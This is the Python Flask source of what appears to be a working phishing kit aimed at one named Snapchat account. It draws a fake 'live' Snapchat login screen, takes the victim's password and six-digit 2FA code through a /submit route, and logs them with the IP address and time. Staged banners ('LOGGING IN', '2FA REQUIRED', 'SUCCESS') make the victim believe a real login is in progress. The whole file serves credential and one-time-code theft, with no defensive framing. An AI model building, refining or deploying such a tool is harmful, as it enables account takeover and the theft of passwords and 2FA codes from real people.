import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

# Global state - we will FORCE clean start
session_state = {
    'started': False,
    'snapchat_loaded': False,
    'last_screenshot': None,
    'error': None,
    'is_fallback': True,
    'update_count': 0,
    'last_action': None,
    'stage': 'login',           # login | password_sent | 2fa | success
    'password_entered': False,
    'code_entered': False
}

def force_clean_login_state():
    """Reset to clean initial login page state"""
    session_state['stage'] = 'login'
    session_state['password_entered'] = False
    session_state['code_entered'] = False
    session_state['last_action'] = None

def create_fresh_live_screenshot():
    """Always generate based on current stage - starts clean"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#0a0a0f')
        draw = ImageDraw.Draw(img)

        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#aaaaaa'
        CARD = '#1a1a1f'
        FIELD = '#25252a'
        GREEN = '#22c55e'
        RED = '#ef4444'

        try:
            f_huge = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
            f_big = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
        except:
            f_huge = ImageFont.load_default()
            f_big = f_huge
            f_small = f_huge

        now = datetime.now()
        time_str = now.strftime("%H:%M:%S.%f")[:-3]
        session_state['update_count'] = session_state.get('update_count', 0) + 1
        rand = random.randint(100000, 999999)
        stage = session_state.get('stage', 'login')

        draw.rectangle([0, 0, width, height], fill='#0a0a0f')

        # === TOP BAR - clearly shows current state ===
        if stage == 'login':
            draw.rectangle([0, 0, width, 58], fill=RED)
            draw.text((15, 8), f"🔴 LIVE SNAPCHAT LOGIN PAGE  |  {time_str}", fill='white', font=f_huge)
        elif stage == 'password_sent':
            draw.rectangle([0, 0, width, 58], fill='#f59e0b')
            draw.text((15, 8), f"🟠 PASSWORD SENT — CLICKED LOG IN  |  {time_str}", fill='black', font=f_huge)
        elif stage == '2fa':
            draw.rectangle([0, 0, width, 58], fill='#3b82f6')
            draw.text((15, 8), f"🔵 2FA CODE NEEDED  |  {time_str}", fill='white', font=f_huge)
        else:
            draw.rectangle([0, 0, width, 58], fill=GREEN)
            draw.text((15, 8), f"🟢 LOGGED IN  |  {time_str}", fill='black', font=f_huge)

        # Main login card
        cw, ch = 410, 470
        cx = (width - cw) // 2
        cy = 75
        draw.rounded_rectangle([cx, cy, cx + cw, cy + ch], radius=16, fill=CARD)

        draw.text((cx + 22, cy + 14), "Log in to Snapchat", fill=WHITE, font=f_big)

        # Username (always prefilled)
        draw.rounded_rectangle([cx + 22, cy + 52, cx + cw - 22, cy + 92], radius=9, fill=FIELD)
        draw.text((cx + 34, cy + 62), "zexoghaith", fill=WHITE, font=f_big)

        # Password field
        draw.rounded_rectangle([cx + 22, cy + 102, cx + cw - 22, cy + 142], radius=9, fill=FIELD)
        if session_state.get('password_entered'):
            draw.text((cx + 34, cy + 112), "••••••••••  ✓", fill=GREEN, font=f_big)
        else:
            draw.text((cx + 34, cy + 112), "••••••••••", fill=GRAY, font=f_big)

        # Log In button
        by = cy + 160
        if stage == 'password_sent':
            draw.rounded_rectangle([cx + 22, by, cx + cw - 22, by + 46], radius=24, fill='#444')
            draw.text((cx + 95, by + 10), "LOGGING IN...", fill='#999', font=f_big)
        else:
            draw.rounded_rectangle([cx + 22, by, cx + cw - 22, by + 46], radius=24, fill=SNAP_YELLOW)
            draw.text((cx + 140, by + 10), "Log In", fill='#000000', font=f_big)

        # Social buttons
        draw.rounded_rectangle([cx + 22, by + 62, cx + cw - 22, by + 100], radius=24, fill=FIELD)
        draw.text((cx + 75, by + 72), "Continue with Google", fill=WHITE, font=f_small)

        draw.rounded_rectangle([cx + 22, by + 112, cx + cw - 22, by + 150], radius=24, fill=FIELD)
        draw.text((cx + 80, by + 122), "Continue with Apple", fill=WHITE, font=f_small)

        # === BIG STATE BANNERS (very obvious) ===
        if stage == 'password_sent':
            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 380], fill='#3f2a00')
            draw.text((cx + 30, cy + 255), "PASSWORD ENTERED", fill='#f59e0b', font=f_huge)
            draw.text((cx + 30, cy + 305), "Log In button was clicked", fill=WHITE, font=f_big)
            draw.text((cx + 30, cy + 340), "Waiting for 2FA or success...", fill=GRAY, font=f_small)

        if stage == '2fa':
            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 400], fill='#1e3a8a')
            draw.text((cx + 45, cy + 255), "2FA REQUIRED", fill='#60a5fa', font=f_huge)
            draw.text((cx + 45, cy + 305), "Enter 6-digit code below", fill=WHITE, font=f_big)
            draw.rounded_rectangle([cx + 45, cy + 345, cx + cw - 45, cy + 390], radius=8, fill='#1e40af')
            if session_state.get('code_entered'):
                draw.text((cx + 70, cy + 355), "123456  ✓", fill=GREEN, font=f_big)
            else:
                draw.text((cx + 90, cy + 355), "______", fill=WHITE, font=f_big)

        if stage == 'success':
            draw.rectangle([cx + 15, cy + 240, cx + cw - 15, cy + 400], fill='#052e16')
            draw.text((cx + 70, cy + 280), "✓ SUCCESS!", fill=GREEN, font=f_huge)
            draw.text((cx + 55, cy + 340), "You are logged in", fill=WHITE, font=f_big)

        # === PROOF BANNERS (so you know it's live and changing) ===
        draw.rounded_rectangle([15, 555, 380, 605], radius=8, fill=RED)
        draw.text((25, 563), f"UPDATE #{session_state['update_count']}", fill='white', font=f_huge)

        draw.rounded_rectangle([15, 615, 520, 670], radius=8, fill=GREEN)
        draw.text((25, 623), f"TIME: {time_str}", fill='black', font=f_huge)

        draw.text((550, 630), f"STAGE:{stage.upper()}", fill='#ff8800', font=f_big)

        draw.rectangle([0, height - 45, width, height], fill='#111')
        draw.text((12, height - 38), "LIVE SIMULATION — Updates every second. Only changes when you submit.", fill='#22c55e', font=f_big)

        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        session_state['last_screenshot'] = now.isoformat()
        return True
    except Exception as e:
        print(f"[FALLBACK] Error: {e}")
        try:
            from PIL import Image
            img = Image.new('RGB', (1280, 720), color=(15, 15, 20))
            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting clean live simulation...")
    
    # === FORCE CLEAN START - no previous test pollution ===
    force_clean_login_state()
    
    create_fresh_live_screenshot()
    session_state['started'] = True
    session_state['is_fallback'] = True
    print("[SESSION] Clean login page active. Will only change after you submit password.")
    
    while True:
        create_fresh_live_screenshot()
        time.sleep(0.82)

@app.route('/')
def index():
    # Make sure we are clean when page is loaded
    if session_state.get('stage') not in ['login']:
        # If somehow polluted, reset
        force_clean_login_state()
        create_fresh_live_screenshot()
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {
        'user': HARDCODED_USER,
        'pass': password,
        'code': code,
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    
    # === ONLY advance state when user actually submits ===
    if password:
        session_state['password_entered'] = True
        session_state['stage'] = 'password_sent'
        session_state['last_action'] = 'password submitted - simulating login click'
        print("[SUBMIT] User submitted password → now showing PASSWORD SENT state")
        create_fresh_live_screenshot()
        return jsonify({
            'status': 'ok',
            'filled': True,
            'message': 'Password sent. Live monitor now shows "LOGGING IN" (orange).',
            'stage': session_state['stage']
        })
    
    if code and len(code) >= 4:
        session_state['code_entered'] = True
        session_state['stage'] = '2fa'
        session_state['last_action'] = '2FA code submitted'
        print("[SUBMIT] User submitted 2FA code")
        create_fresh_live_screenshot()
        return jsonify({
            'status': 'ok',
            'filled': True,
            'message': '2FA code sent.',
            'stage': session_state['stage']
        })
    
    create_fresh_live_screenshot()
    return jsonify({'status': 'ok', 'filled': False})

@app.route('/screenshot')
def screenshot():
    create_fresh_live_screenshot()
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    response = send_from_directory(STATIC_DIR, 'screenshot.png')
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    return response

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat()
    })

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Screenshot thread started (clean login state)")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)